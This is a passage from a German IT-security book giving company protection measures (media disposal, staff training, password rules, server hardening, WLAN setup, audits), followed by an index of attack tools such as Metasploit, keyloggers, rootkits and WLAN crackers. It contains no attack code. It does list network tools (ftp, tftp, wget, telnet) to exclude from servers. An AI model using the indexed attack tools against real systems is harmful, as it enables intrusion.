pr\u00fcfen und festzulegen, welche Mitarbeiter Zutritt zu schutzbed\u00fcrftigen R\u00e4umlichkeiten erhalten.\n20.3 Teilbereich Personal\n585\nEntsorgung sch\u00fctzenswerter Materialien Werden Unterlagen, die vertrauliche Notizen erhalten, achtlos zum Papierm\u00fcll gegeben, leistet man Angreifern ungewollt Sch\u00fctzenhilfe: Viele Materialien, die beispielsweise beim \u00bbDumpster Diving\u00ab \u2013 dem Durchsuchen der M\u00fclltonnen nach verwertbaren Gegenst\u00e4nden \u2013 aufgetan werden, enthalten wertvolle Inhalte und k\u00f6nnen der Vorbereitung eines Angriffs dienlich sein. Speziell Datentr\u00e4ger wie B\u00e4nder, Festplatten oder optische Medien wie CD-ROMs, die sensible Informationen enthalten und nicht mehr gebraucht oder ausgemustert werden sollen, sind so zu entsorgen, dass keinerlei R\u00fcckschl\u00fcsse auf vorher gespeicherte Daten m\u00f6glich sind (z. B. mit Wiping Tools wie dem quelloffenen und kostenlosen Darik's Boot and Nuke292). Nicht vergessen werden sollten dabei sowohl aktuelle Fotokopierer als auch Multifunktionsdrucker, die oftmals eine integrierte Festplatte beherbergen und somit eine Vielzahl interessanter Daten beinhalten.\n20.3\nTeilbereich Personal\nEinarbeitung neuer Mitarbeiter Kommen neue Mitarbeiter in das Unternehmen, sind ihnen interne Regelungen und Verfahrensweisen zum IT-Einsatz bekannt zu geben. Insbesondere m\u00fcssen die ITSicherheitsziele und Vorschriften zur IT-Sicherheit erl\u00e4utert werden. Vertretungsregelungen Vertretungsregelungen sind wichtig, um sicherzustellen, dass f\u00fcr vorhersehbare und auch unvorhersehbare F\u00e4lle des Personenausfalls die Fortf\u00fchrung der Aufgabenwahrnehmung erm\u00f6glicht wird. Vor Eintritt eines Personalausfalls muss somit \u2013 idealerweise schriftlich \u2013 geregelt sein, wer wen in welchen Angelegenheiten und mit welchen Kompetenzen vertritt. Schulung zu IT-Sicherheitsma\u00dfnahmen Schulungen der Mitarbeiter zu IT-Sicherheitsma\u00dfnahmen sind ein elementarer Bestandteil zur IT-Sicherheitsphilosophie. Wir empfehlen regelm\u00e4\u00dfige Schulungen der Mitarbeiter, um jeden Einzelnen zum sorgf\u00e4ltigen Umgang mit der IT zu motivieren (beispielsweise alle zwei Jahre oder alternativ durch Ausgabe von Informationsmaterial). Die Schulung sollte eine Sensibilisierung f\u00fcr IT-Sicherheit sowie die Vorstellung des Sicherheitskonzepts, den richtigen Einsatz von Passw\u00f6rtern, die Einweisung in Notfallma\u00dfnahmen und den Umgang mit personenbezogenen Daten umfassen. Schulung des Wartungs- und Administrationspersonals Da Administratoren detaillierte Kenntnisse \u00fcber die eingesetzten IT-Komponenten ben\u00f6tigen, sind diese mindestens so weit zu schulen, dass allt\u00e4gliche Administrationsarbeiten selbst durchgef\u00fchrt, einfache Fehler selbst erkannt und behoben, Datensicherun-\n292\nhttp://www.dban.org/download\n586\nKapitel 20 \u2013 Company Networking\ngen regelm\u00e4\u00dfig selbstt\u00e4tig durchgef\u00fchrt, Eingriffe von externem Wartungspersonal nachvollzogen und Manipulationsversuche oder unbefugte Zugriffe auf die Systeme erkannt und rasch behoben werden k\u00f6nnen. Ausscheiden von Mitarbeitern Das Ausscheiden eines Mitarbeiters verl\u00e4uft bei vielen Unternehmen \u00e4u\u00dferst inkonsequent (so auch in Hollywood-Blockbustern immer wieder gerne gesehen, beispielsweise in \u00bbPaycheck\u00ab mit Ben Affleck). Wir empfehlen die Definition eines Prozesses, in dem die Gesch\u00e4ftsf\u00fchrung, die Abteilung Personal, die IT sowie der IT-Sicherheitsbeauftragte eingebunden sind. Von besonderer Bedeutung ist hierbei, dass von dem Ausscheidenden s\u00e4mtliche Unterlagen, Schl\u00fcssel, ausgeliehene IT-Ger\u00e4te, Ausweise und Karten mit Zutrittsberechtigungen eingezogen werden m\u00fcssen. Zudem sind eingerichtete Zugangsberechtigungen und Zugriffsrechte einzufrieren und nach einer Karenzzeit zu l\u00f6schen. Datensicherung und \u00dcbungen zur Datenrekonstruktion Zur Vermeidung von Datenverlusten m\u00fcssen regelm\u00e4\u00dfige Datensicherungen durchgef\u00fchrt werden, und es sind Regelungen zu treffen, welche Daten von wem wann zu sichern sind. Hierbei sind mindestens die Daten regelm\u00e4\u00dfig zu sichern, die nicht aus alternativen Informationen abgeleitet werden k\u00f6nnen. Zus\u00e4tzlich ist eine regelm\u00e4\u00dfige Rekonstruktion von Daten in Form vereinzelter Restores zu testen. Zumindest einmal sollte nachgewiesen werden, dass eine vollst\u00e4ndige Datenrekonstruktion m\u00f6glich ist. Einsatz von Antivirensoftware Jeder Rechner \u2013 gerade dann, wenn Windows eingesetzt wird \u2013 ist mit einem zuverl\u00e4ssigen Virenscanner auszustatten. Die Verwaltung nebst Vergabe der Anti-Viren-Patterns sollte zentral steuerbar sein, wie es bei g\u00e4ngigen Enterprisel\u00f6sungen anzutreffen ist. Zur Steigerung des Sicherheitsniveaus tragen dar\u00fcber hinaus Antiviren-Mail-Gateways bei, die jede ein- und ausgehende E-Mail auf m\u00f6glichen Sch\u00e4dlingsbefall untersuchen und den Versand unerw\u00fcnschter Dateitypen wie beispielsweise *.EXE und *.COM unterbinden. Verschl\u00fcsselung Wir empfehlen die Entwicklung von Vorgaben zur Verschl\u00fcsselung in Form eines Verschl\u00fcsselungskonzepts, um vertrauliche Daten, die beispielsweise per E-Mail durch das Internet verschickt werden, vor dem Zugriff unberechtigter Dritter zu sch\u00fctzen. Hierbei k\u00f6nnen als Werkzeuge die freien oder kostenlosen Programme GnuPG293 und AxCrypt294 in Betracht kommen. Alternativ zu einem Verschl\u00fcsselungskonzept sollte als flankierende Ma\u00dfnahme die innerbetriebliche Aufkl\u00e4rung, beispielsweise im Rahmen einer Schulung oder in Form eines Handouts, zur Sensibilisierung beim Versand ver-\n293\nhttp://www.gnupg.org\n294\nhttp://www.axantum.com/AxCrypt\n20.3 Teilbereich Personal\n587\ntraulicher Daten \u00fcber ein unsicheres Medium wie dem Internet durchgef\u00fchrt werden (Stichwort \u00bbDatenpostkarte\u00ab). Verbot nicht freigegebener Hard- und Software Der Einsatz nicht freigegebener Hard- und Software stellt ein nicht zu untersch\u00e4tzendes Problem dar: Der unkontrollierten Mitnahme von Daten sind T\u00fcr und Tor ge\u00f6ffnet, zudem k\u00f6nnen privat beschaffte und installierte Programme nicht nur Viren und W\u00fcrmer einschleusen, sondern auch den Staatsanwalt zu einem Anstandsbesuch veranlassen. Das Einspielen bzw. Benutzen nicht freigegebener Hard- und Software muss somit verboten und allen Mitarbeitern gegen\u00fcber in schriftlicher Form kommuniziert werden. Im Idealfall wird das Einspielen von Software technisch unterbunden. Vorgaben zum Passwortgebrauch Da die Sicherheit eines Systems entscheidend davon abh\u00e4ngt, dass das Passwort korrekt gebraucht wird, ist es empfehlenswert, eine Regelung zum Passwortgebrauch zu vereinbaren. Die Regeln zum Passwortgebrauch sollten beinhalten, dass sich Kennw\u00f6rter aus mindestens 8 Zeichen, bestehend aus Gro\u00df- und Kleinbuchstaben, Zahlen und Sonderzeichen zusammensetzen. Die Verwendung von Trivialkennw\u00f6rtern ist zu untersagen. Zus\u00e4tzlich sollten regelm\u00e4\u00dfige Versuche zur Errechnung von Kennw\u00f6rtern durchgef\u00fchrt werden, beispielsweise mit einem Password-Cracker-Programm, um zur Sensibilisierung beizutragen. Ernennung eines Administrators und eines Vertreters F\u00fcr jedes IT-System ist ein Administrator zu bestimmen, der f\u00fcr allgemeine Administrationsarbeiten und Sicherheitsbelange verantwortlich ist. Zus\u00e4tzlich sind Vertreter zu benennen, die bei Verhinderung eines Admins die Funktionen weiter aufrechterhalten k\u00f6nnen. Passwortschutz f\u00fcr IT-Systeme Jedes IT-System muss \u00fcber einen Passwortschutz verf\u00fcgen, um zu verhindern, dass sich Unbefugte am System anmelden und sich m\u00f6glicherweise Daten oder Rechte aneignen. \u00c4nderung voreingestellter Passw\u00f6rter Da von Herstellern voreingestellte Passw\u00f6rter hinl\u00e4nglich bekannt sind, m\u00fcssen sie direkt nach der Installation, sp\u00e4testens aber bei erstmaliger Inbetriebnahme von Hardoder Software abge\u00e4ndert werden. Eine umfangreiche Liste mit Defaultpassw\u00f6rtern findet sich beispielsweise auf der Website von Phenoelit295. \u00dcberpr\u00fcfung des Hard- und Softwarebestands Wir raten zu einer regelm\u00e4\u00dfigen \u00dcberpr\u00fcfung des Hard- und Softwarebestands, um Verst\u00f6\u00dfe gegen das Verbot der Nutzung nicht freigegebener Hard- und Software fest-\n295\nhttp://www.phenoelit-us.org/dpl/dpl.html\n588\nKapitel 20 \u2013 Company Networking\nstellen zu k\u00f6nnen. Die \u00dcberpr\u00fcfung erfolgt idealerweise automatisiert mithilfe einer Inventarisierungssoftware, die vor dem Einsatz jedoch mit dem Betriebsrat (sofern vorhanden) abzustimmen ist. Kontrolle der Logdateien Eine nachl\u00e4ssige Kontrolle von Logfiles kann dazu f\u00fchren, dass entweder Fehler oder vielleicht sogar der Einbruch eines Angreifers unentdeckt bleiben. Wir bef\u00fcrworten folglich die regelm\u00e4\u00dfige Kontrolle und Auswertung protokollierter Daten.\n20.4\nTeilbereich Technik\nSichere Installation eines Servers Die Installation eines Servers muss grunds\u00e4tzlich sicher erfolgen. Dazu z\u00e4hlen vor allem die Erstellung eines Installationskonzepts und einer ausf\u00fchrlichen Dokumentation, der Bezug des Installationsmediums aus vertrauensw\u00fcrdigen Quellen und die Einbindung erforderlicher Sicherheitspatches vor Inbetriebnahme. Sichere Grundkonfiguration eines IT-Systems Diese Ma\u00dfnahme widmet sich der H\u00e4rtung des Systems unter anderem mit dem Ziel, gegen \u00bbeinfache\u00ab Angriffe \u00fcber das Netz gewappnet zu sein. Hierzu z\u00e4hlen beispielsweise durchdachte Einstellungen f\u00fcr den Systemadministrator, eine \u00dcberpr\u00fcfung der Netzdienste, einhergehend mit dem zwingenden Verzicht auf unn\u00f6tige Dienste, sorgsame Einstellungen f\u00fcr den Zugriff auf das Netz sowie die m\u00f6gliche Einbindung lokaler Paketfilter. Zudem ist unbedingt zu beherzigen, keine unn\u00f6tigen Entwicklerwerkzeuge wie z. B. Compiler, Skriptsprachen und \u00bbkommunikativer Tools\u00ab wie z. B. ftp, tftp, wget, oder telnet einzubinden, die zu uns\u00e4glichen Verquickungen f\u00fchren k\u00f6nnen. Unverz\u00fcgliches Einspielen sicherheitsrelevanter Patches und Updates Werden Fehler in Softwareprodukten bekannt, die dazu f\u00fchren k\u00f6nnen, dass die Sicherheit von IT-Systemen beeintr\u00e4chtigt wird, sind diese Schwachstellen so schnell wie m\u00f6glich zu beheben. Andernfalls k\u00f6nnen die Schw\u00e4chen m\u00f6glicherweise durch Angreifer ausgenutzt werden, wie in zahlreichen F\u00e4llen geschildert. Die Systemadministratoren sind deshalb dazu anzuhalten, sich regelm\u00e4\u00dfig \u00fcber bekannt gewordene Softwareschwachstellen zu informieren, beispielsweise durch IT-Hersteller, Mailinglisten wie Bugtraq296 oder Websites wie dem Heise-Ticker297. Protokollierung Die Protokollierung der Server sollte in einem sinnvollen Umfang aktiviert sein, um eine regelm\u00e4\u00dfige \u00dcberpr\u00fcfung m\u00f6glich zu machen. Es sollten alle sicherheitsrelevanten\n296\nhttp://www.securityfocus.com/archive/1 und http://seclists.org/bugtraq\n297\nhttp://www.heise.de\n20.4 Teilbereich Technik\n589\nEreignisse protokolliert werden. Dabei sind insbesondere falsche Passworteingabe f\u00fcr eine Benutzerkennung, Versuche von unberechtigten Zugriffen, Reboots und Daten zur Netzauslastung und -\u00fcberlastung von Bedeutung. Die Protokolldateien sollten idealerweise an einen dedizierten Loghost versandt werden, dessen Installation eklatante Unterschiede zu den anderen im Netzwerk eingesetzten Systemen aufweist (Stichwort Heterogenit\u00e4t). Bildschirmsperre Wir empfehlen eine Bildschirmsperre, die sich nach 5 \u2013 10 Minuten Inaktivit\u00e4t automatisch aktiviert. Zudem bef\u00fcrworten wir eine Arbeitsanweisung, die festlegt, dass Mitarbeiter vor Verlassen des Arbeitsplatzes den Bildschirm manuell zu sperren haben \u2013 also noch vor Inkrafttreten des automatischen Lockings. Umgang mit Laufwerken f\u00fcr Wechselmedien und externen Datenspeichern In vielen Unternehmen sind Laufwerke f\u00fcr Wechselmedien und externe Datenspeicher (z. B. USB-Ports) nicht verschlossen. Wir empfehlen, diesen Gefahren durch geeignete organisatorische und technische Sicherheitsma\u00dfnahmen entgegenzuwirken, beispielsweise durch den Verschluss von Laufwerken oder dem Einsatz spezieller Software sowie der Erstellung verst\u00e4ndlicher Richtlinien f\u00fcr die Nutzung. Verschl\u00fcsselung f\u00fcr Notebooks Gerade Notebooks sind beliebte Opfer zahlreicher Missgeschicke. Mal werden die Ger\u00e4te leichtsinnig im Taxi liegen gelassen, gestohlen oder verschwinden wie von selbst (insbesondere Gro\u00dfbritannien wird offenbar regelm\u00e4\u00dfig von dieser besonderen Form des Datendiebstahls298 heimgesucht). Festzuhalten bleibt, dass der Verlust der auf dem Notebook gespeicherten Daten das Unternehmen oftmals teurer kommt, als der Ger\u00e4tepreis selber \u2013 gerade dann, wenn es sich um sensible Unternehmensdaten handelt. Es ist somit sinnvoll, ein Verschl\u00fcsselungsprogramm einzusetzen, das einzelne Dateien, bestimmte Bereiche oder die ganze Festplatte so verschl\u00fcsselt, dass ausschlie\u00dflich Berechtigte Zugriff auf die Daten nehmen k\u00f6nnen. F\u00fcr die Verschl\u00fcsselung bestimmter Bereiche (z. B. einer Containerdatei) oder der gesamten Festplatte bietet sich f\u00fcr Privatanwender das kostenlose Open-Source-Verschl\u00fcsselungsprogramm TrueCrypt299 an, w\u00e4hrend die Unternehmungen ihre Vertreter im kommerziellen Enterprise-Sektor300 finden. Protokollierung der Aktivit\u00e4ten im Netz Die Protokollierungs- und Audit-Funktionen der Netzwerkkomponenten sind in einem sinnvollen Umfang zu aktivieren. So sind neben Performancemessungen zur \u00dcberwachung der Netzlast insbesondere die Events auszuwerten, die beispielsweise auf ARP-\n298\nhttp://www.heise.de/newsticker/meldung/Laptop-mit-vertraulichen-Daten-bei-eBay-verkauft-184724.html\n299\nhttp://www.truecrypt.org\n300\nz. B. das Programm \u00bbSafeGuard Easy\u00ab der Firma Utimaco/ Sophos \u2013 http://www.utimaco.de\n590\nKapitel 20 \u2013 Company Networking\nSpoofing-Attacken hindeuten. Die Logfiles werden idealerweise an einen dedizierten Loghost weitergereicht. Upgrade der Firmware von Hardwarekomponenten Nicht nur Serverdienste und normale Software sind oftmals fehlerhaft, auch Hardwarekomponenten k\u00f6nnen Schw\u00e4chen aufweisen. So kann ein Update der Firmware von aktiven Netzkomponenten wie z. B. Switches, Router oder Access-Points Schwachstellen beseitigen. Ein Update ist insbesondere dann notwendig, wenn Verwundbarkeiten bekannt werden, die Auswirkungen auf den sicheren Betrieb des Ger\u00e4ts haben. Verhinderung ungesicherter Netzzug\u00e4nge Der Verhinderung ungesicherter Netzzug\u00e4nge, z. B. durch Modems, ISDN-Karten oder WLAN-Router, kommt in einem Unternehmen ein hoher Stellenwert zu: Es m\u00fcssen Regelungen getroffen werden, dass keine weiteren externen Verbindungen unter Umgehung der Firewall geschaffen werden d\u00fcrfen. Sichere Konfiguration von Access-Points Soll in dem Unternehmen WLAN eingesetzt werden, m\u00fcssen die Access-Points unbedingt sicher konfiguriert sein. Dazu z\u00e4hlt beispielsweise die Einbindung einer harten Verschl\u00fcsselung, z. B. OpenVPN, IPSec, mindestens aber das Industrieprotokoll WPA2. Zudem sind administrative Zugriffe \u00fcber die Luftschnittstelle generell zu unterbinden, komplexe Administrationspassw\u00f6rter zu w\u00e4hlen, unsichere Administrationszug\u00e4nge (z. B. \u00fcber Telnet oder HTTP) abzuschalten, eine nichtsprechende SSID zu vergeben und die SSID-Broadcast zu deaktivieren. In Zeiten, in denen der Access-Point nicht verwendet wird, ist er idealerweise vom Strom zu trennen, beispielsweise mit einer Zeitschaltuhr, die in jedem Baumarkt f\u00fcr 2,50 EUR erworben werden kann. Integration von Proxyservern Der Zugang zum Internet sollte \u00fcber einen zentralen Proxyserver erfolgen, mit dem sich u. a. der Webtraffic auf Malware kontrollieren, unerw\u00fcnschter Content ausschlie\u00dfen und ein effektives Berechtigungskonzept zum Webzugang umsetzen l\u00e4sst. Caching- und Loggingfunktionen schaffen zus\u00e4tzliche Transparenz. IT-Security Audits In etlichen Angriffszenarien haben wir den Einsatz von Schwachstellenscannern beschrieben. Aber die meisten dieser Security-Scanner dienen einem gegens\u00e4tzlichen, n\u00e4mlich pr\u00e4ventiven Zweck. Viele ungepatchte und anf\u00e4llige Systeme stellen f\u00fcr das Firmennetzwerk ein gravierendes Sicherheitsrisiko dar. Es sollte deshalb zur Regel werden, in gewissen Zeitabst\u00e4nden seine Systeme mithilfe eines oder mehrerer SecurityScanner (z. B. OpenVAS oder Nessus) zu \u00fcberpr\u00fcfen und so einem potenziellen Angreifer zuvorzukommen. Insbesondere nach Inbetriebnahme neuer Systeme zeigt sich, ob bzw. inwieweit Policies zur sicheren Administration ber\u00fccksichtigt werden oder nicht. Eine regelm\u00e4\u00dfige Aus-\n20.4 Teilbereich Technik\n591\nwertung der Logs zeigt, inwieweit es der Verantwortliche f\u00fcr Informationssicherheit geschafft hat, systematische Sicherheitsverbesserungen umzusetzen.\nAls Fazit bleibt festzuhalten, dass es sich bei den soeben vorgestellten Ma\u00dfnahmen ausschlie\u00dflich um handverlesene Filetst\u00fcckchen des Gesamtkunstwerks \u00bbInformationssicherheit\u00ab handelt. Wer ein schlechtes Gewissen bekommen hat, sollte unverz\u00fcglich mit der Umsetzung beginnen. Die restlichen Vertreter, denen die Ma\u00dfnahmen ein souver\u00e4nes Grinsen entlockten, sollten sich einer echten Herausforderung stellen: den IT-Grundschutz-Katalogen des BSI. Das umfassende Werk steht kostenfrei im Internet zur Verf\u00fcgung und bietet diversen Mehrwert. Wir k\u00f6nnen die Informationssicherheitsverantwortlichen der Unternehmen nur ermutigen, sich einzulesen und wirksame Schadensvorbeugung durch Prophylaxe zu betreiben.\n593\nStichwortverzeichnis Symbole .htaccess-Datei 253 0x333shadow 101 4-Way-Handshake 318, 319, 320 7zBlade 95\nARPSpoof 427, 428, 429, 430 Aspack 353 Atelier Web Remote Commander 59 Audio Recorder 165 Audiowanze 166 Aufkl\u00e4rung 569, 570, 572 Aurora 489, 492 A Authention 157 Access Point 262, 289, 290, 292, 295, 296, Automatische Updates 535, 536, 542, 568 300, 307, 310, 313, 327, 330, 336 AccessDiver 231, 232, 233, 235, 236, 238, 239 autopwn 488 AW Security Portscanner 49 Acunetix 231, 242, 243, 244 Azrael666 224, 226 ADS 556, 557, 558, 559, 560 Advanced Checksum Verifiers 574 Advanced Direct Remailer 341 B Advertizer 373 Backdoor 350, 363, 365, 377, 500 AES 335 Backup 560, 575, 576 Airbase-NG 114, 330, 331, 332 Banner-Grabbing 203 Aircrack-NG 111, 303, 305, 307, 315, 320, BarsWF 525 321, 322, 330 Baseline Security Analyzer 535, 541 Aircrack-PTW 303 Benutzerkonten 565 Aireplay-NG 112, 315, 319 Bind Shell 475, 478 Airmon-NG 305, 317, 331 Bios Keyboard Buffer 139 Airodump-NG 113, 307, 309, 310, 311, 312, BKA-Faker 344 315, 317, 318, 319, 321, 322, 335 Black Hat Konferenz 353 Airoscript 316 Blunden, Bill 552 Airsnort 302 Boot-CD 135 Angreifer 123, 124, 128, 131, 134, 137, 139, Bootkit Stoned 367 141, 143, 144, 145, 146, 147, 149, 155, 158, Brain 2.0 378, 379 159, 160, 161, 162, 163, 164, 165, 166, 167, Brute Force-Angriff 132 172, 175, 184, 187, 188, 190, 191, 192, 193, Brute Forcer 241 197, 198, 199, 201, 202, 203, 217 Brute-Force-Passwort-Knacker 179 anonymous 221, 222 Brutus 229, 230, 231 Anti Hackerz Book 2007 562 BSSID 303 Anti-Rootkit 169, 551, 563 BTF-Sniffer 167 Apache 461 Bugtraq 443, 453 Ardamax 22 Bundestrojaner 174, 366 Ardamax Keylogger 22\n594\nStichwortverzeichnis\nC Cache Poisoning 211 Cain & Abel 39 CCC Ulm 381 CGI-Scanner 244 CMOS 131, 132, 134, 149 CMOSPwd 29 Cold Boot Attack 139 Combolisten 239, 240 Conficker 469 coWPAtty 115, 322, 324 Cross Site Scripting 219 CUDA 324 Czybik Gen Creation Kit 98, 347 D DDoS-Attacken 220 Debugviewer 364 Deep Freeze 570, 571 Defacement 219 Desktop-Firewall 198 DeviceLock 107 DHCP-Dienst 292 DHCP-History 399 DHCP-Server 398, 399 Dienste 541, 542, 543, 544, 545, 546 Digital Attacks Archive 219 DKOM 363 DNS-Dienst 296 Driftnet 334, 424 Drive-by-Download 375 Driven by Ignorance 377 Driver Snapshot 368 DSniff 80, 413, 414, 415 DSniff-Suite 413, 415, 422, 427 E eBlaster 167 Elcomsoft 525 Elite Keylogger 20 Elite Keylogger V.1 24 E-Mailadresse faken 340 E-Mail-Rechnung 346 Enumeration 187, 203, 209, 212 eNYeLKM 509, 513, 514 ERUNT 367, 543\nESSID 328, 331 Ettercap 87, 407, 410 Ettercap NG 87, 398, 402, 405, 406, 409, 410, 411, 412, 413 evilbs 500, 504, 505 EXE-Packer 353 Exploit 127, 181, 182, 202 Exploiting 391, 392 Exploits 127, 180, 181, 192, 391, 392, 443, 450, 453, 454, 459, 461, 462, 469, 472, 475, 476, 488 Eyecatcher 343\nF Fake AP 327 Fake-Authentication-Attack 312, 313 Feldstudie der RWTH Aachen 258 Festplattenverschl\u00fcsselungstools 151 fEvicol 100, 347 FileCheckMD5 574 Fingerprinting 187, 188, 202, 206, 212 Firewall 339, 353, 356, 357, 359, 360, 361, 368, 378, 382, 383, 535, 541, 546, 547, 563, 568 Firewallkiller 358 Fishing for passwords 176 FreeCap 56 Frontpage Serverextensions 224 FTP Password Recovery Master 178 FTP-Server 412, 461 FU Rootkit 363 Full-Disclosure 453 Full-Scan 546 Funknetze 258, 259, 265, 273, 275, 279, 282, 288, 290, 296, 302, 303, 309 FX-Scanner 206 G GFI LANguard N.S.S. 70 Gh0st Rat 353 GISKismet 279, 285, 286, 287, 288 GMER 169, 553 GNU MAC Changer 106 Google 490 Google Earth 262, 265, 279, 282, 283, 284, 285\nStichwortverzeichnis\nGoogle Hacking 175, 176, 187 Dating Base 248 for Penetration Testers 248 Google Hacks 185 GPS 259, 261, 262, 263, 265, 279, 280, 281, 282, 285 GPS Visualizer 279 GPU 324\nH Hacker 126 Hacker Defender Rootkit 363 Hacker_Defender 67 Hardware-Keylogger 24, 132, 141, 148 Helios 169 Hijackthis-Logs 551 HIPS 172 Hooking 362 Host Discovery 436 Hot-Spots 258, 259, 262, 266, 278, 279, 280, 282, 285, 288, 289, 290, 296, 312, 314, 327 Hydra 30, 527, 528 I IceSword 169 ICESWORD 555 ICMP-Ping 198 IFrame 489, 494 IIS 461 Innent\u00e4ter 393 IP-Adresse 340, 342, 382 IP-Branche 531 IPC$-Freigaben 205 IP-Telefonie 531 ISP 340, 342, 373, 383 IT-Security Audits 590 itWatch 107 iwconfig 289, 292, 300, 301, 308\n595\nKernel-Rootkits 370 Keylogger 133, 134, 148, 152, 159ff., 169ff., 348, 350, 363, 365, 366, 375, 380, 391, 498, 519, 520 Kindersicherung 570 Kismet 266, 304 Kismet-Newcore 110, 262, 266ff., 285, 286, 289ff., 295, 297ff., 303, 309f. Kismet-Newcore KiTrap0D 137 Korek 307\nL L0phcrack 40 LanManager-Hash 140, 149 Lanspy 48 Legion 193, 206 LHOST 479, 480 Linux-Systeme 141 LKM 499, 510 LKM-Rootkit 509 localhost 480 Log-Cleaner 498 Logfile-Cleaner 514, 515, 518 Login-Daten 391, 402, 405, 409, 411, 412, 414, 415, 451, 520, 521 Logkeys 20, 520 Lokale Sicherheitsrichtlinien 572 LPORT 476\nM MAC-Adresse 289, 297, 298, 299, 300, 301, 303, 307, 312, 314, 394, 395, 396, 399 MAC-Filter 289, 297, 301 Mailanh\u00e4nge 379 MailSnarf 81, 415, 419 Malware 127, 128, 160, 162, 174, 346, 348, 349, 350, 351, 352, 353, 356, 357, 359, 362, 366, 367, 368, 370, 372, 377, 381, 386 Malware-Downloads 377 J Mamutu 386, 388 John the Ripper 36, 522, 523 Man-in-the-Middle 427, 430 Joomla 461 Mapping 391 Matrix 175, 202 K Kartografierung 279, 280, 281, 282, 284, 285 MBSA 535, 536, 538, 539, 540 McGrew Security RAM Dumper 139 Kernel 426, 434, 451, 453, 499, 504 MDK3 117, 326, 327, 328, 329, 330, 335 Kernelpacker 353\n596\nStichwortverzeichnis\nMedusa 32, 525, 526, 527, 528 Metaexploit Framework 252 Metasploit Framework 93, 137, 461, 475, 476, 478, 488, 489, 490, 498 Meterpreter 475, 481, 485, 489, 498 Meterpreter-Session 492, 494, 495 Microsoft 498 milw0rm.com 457 Mood-NT 504, 508, 509 Mozilla Firefox 360, 370, 375, 380 MS08-067 469 MsgSnarf 419, 421 MySQL 461\nN NakedBind 104 ncat 442 Ncat 105, 509 ndiff 442 Nessus 71, 182, 183, 188, 211, 217, 444 Net Tools 96 NETAPI 461 Netbios-Support 216 Netbrute Scanner 206 Netcat 105, 204 netstat 212 NetStumbler 261, 279, 280 Network Adress Translation 383 Neuinstallation 541, 570 Nmap 46, 54, 202, 435, 436, 440, 443, 450, 451, 457, 469, 489, 525 nmapFE 442 Nod32 381 N-Stalker 211 NTFSext.exe 559 NTLM-Algorithmus 140 Nutzlast 469, 475, 476 O Oddysee_Rootkit 66 Offline NT Password & Registry Editor 41 Open Vulnerability Assessment System 73 OpenDNS 332 OpenVAS 73, 217, 443, 444, 449, 450, 457 ophcrack 523, 524 OphCrack 37\nOrigami 355 Orvell 167\nP p0f 53, 398, 424, 425, 426 Paros 231, 242, 245 Passphrase 317, 336 Password Renew 135 Password-Cracker 498, 522 Patches 535, 539, 540, 541, 568 Payload 346, 350, 351, 352 PAYLOAD 469, 476, 478 PCMCIA-WLAN-Karte 260 PE-Builder 135, 136, 173 PECompact 353 PE-Crypter 352 Pharming 335 PHoss 85 Port Explorer 213, 214, 370, 372, 383 Portscan 176, 188, 197, 200, 214, 430 Process Explorer 544, 545 ProcessGuard 386, 569 Promiscuous Mode 394, 413 Proxy 225, 230, 233, 234, 235, 236, 237, 241, 245, 250 Proxy Finder 57 Proxyjudges 236 Proxyliste 234, 235, 237 Proxyserver 340, 342 PWDUMP 35 PW-Inspector 42, 320 Pyrit 116, 324, 325 R Raiffeisenbank 344 Rainbow Tables 322, 323, 324, 523 RATs 348, 563, 564 Registry 543, 551, 570, 574 Relay-Server 341 Remote Administration Tool 155, 167, 188, 348 Remote-Code- Execution-Attacks 373 Remote-Installation 162 Reset-Paket 45 Reverse-Root-Shell 509, 513, 514 Reverse-Shell 475\nStichwortverzeichnis\nRHOST 473 Ring 0 362 RK-Demo-Rootkits 363 Root-Kennwort 141, 142 Rootkit Arsenal 552 Rootkit Unhooker 556 Rootkitaktivit\u00e4ten 161 Root-Remote-Exploit 457 RPC 469 RPC/DCOM 461 R\u00fccksetzen des Administratorpasswortes 136, 149 Rustock 2010 68\nS Safend Protector 571 Sam Spade 343 Samba 461 Samba-Server 457 SAM-Datei 139 SAMInside 38, 140 Sandbox 352, 384, 385 Sandboxie 384, 385, 386 Sasser 123 Scanning 391, 392, 430, 436, 443, 450, 469, 525 Script-Kiddies 377 Searchbars 351 Security Suite 156, 158 Sentinel 574, 575 Server Message Block 544 Services 541, 543, 544, 553 Sharp Defacer 227 Shields Up 214 SINA-Boxen 174 Single-User-Runlevel 142, 146 Skript-Kiddie 125, 127, 128 SMAC 395 Smart Card 150 Snarfing 334, 335 Sniffer 394, 398, 402, 413, 414, 424, 427, 498, 530 Sniffer-Programme 394 Sniffing 391, 392, 394, 406, 407, 410, 413, 427, 430\n597\nSocial Engineering 132, 161, 183, 228, 229, 421 Software-Keylogger 159, 169 sort 321 Spector Pro 167 SpoonWep 316 Spurensucher 175 Spybot-Search & Destroy 550 SpyEye 496 SQL-Injection 242, 243 SSID 273, 289, 290, 291, 292, 293, 297, 298, 300, 303 Stealth Recorder Pro 23 stealthen 162 Surveillance Tools 160, 162, 169, 173 Syskey 140 Systemver\u00e4nderungen 566, 570, 572, 573 Systemwiederherstellung 560, 561\nT t0rnkit 504 TCP Connect Scanning 45, 200, 201 TCP FIN/NULL/XMAS Scan 45 TCP SYN Scan 45 Tcpdump 293, 294, 396, 397, 398, 402, 425 Telefonanlage 525 Telnet 190, 197, 204, 207 Threatfire 386, 387, 388 TightVNC 481 Trojaner 346, 348, 350, 351, 352, 358, 359, 360, 367, 375, 376, 378, 489, 560, 563, 565 Trojanerbauk\u00e4sten 348, 379 Trojanerimplants 360 Troll Downloader 97 U UDP Scan 46 UMTS 331 Unicode Web Traversal 224 Unicode-Exploits 225 Unreal 363, 364 urlsnarf 83 URLSnarf 422, 423 USB 2.0 IDE Adapter 132 USB Switchblade 95\n598\nStichwortverzeichnis\nWinfingerprint 50, 203 Winlockpwn 139 WinLogon 154 Wired Equivalent Privacy 109 Wireshark 89, 398, 400, 401, 402, 425 WLAN-Studie der TU Ilmenau 257 WLAN-WLAN-Adapter 260 V WMF-Exploit 375 Videocodec 375, 376 WMF-Maker 99 Virenbauk\u00e4sten 347 WPA 109, 289, 335 Virtual Machine Based Rootkits 499 WPA 275 Virtuelle Tastatur 148 WPA2 120, 258, 275, 289, 316, 317, 321, 322, Vista-PCs 141 Vistumbler 118, 261, 264, 266, 279, 280, 282, 326, 335, 336 WS FTP hacker 178 283, 290 wunderbar_emporium 453 VNCrack 34 VNC-Viewer 480 VoIP 530, 531 X X-NetStat Professional 69 Xprobe2 51, 431, 434 W X-Scan 188, 207, 208, 209, 210, 211, 217 w3bfukk0r 77 XSS 219, 244 Wardriving 257, 259, 302 